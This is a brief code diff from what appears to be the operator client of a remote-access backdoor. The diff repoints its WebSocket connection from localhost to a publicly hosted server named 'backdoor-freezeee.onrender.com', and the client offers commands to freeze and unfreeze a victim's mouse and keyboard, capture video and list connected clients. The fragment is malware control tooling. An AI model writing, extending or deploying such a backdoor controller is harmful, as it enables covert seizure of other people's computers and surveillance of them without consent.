@@ -1,7 +1,7 @@
-import WebSocket from "ws";
-import readline from "readline"
+const WebSocket = require("ws");
+const readline = require("readline");
 
-const ws = new WebSocket("ws://localhost:8602");
+const ws = new WebSocket("https://backdoor-freezeee.onrender.com");
 
 const optionsTable = "M - Freeze Mouse\nK - Freeze Keyboard\nUM - Unfreeze Mouse\nUK - Unfreeze Keyboard\nV - Video\nLC - List Clients";
 
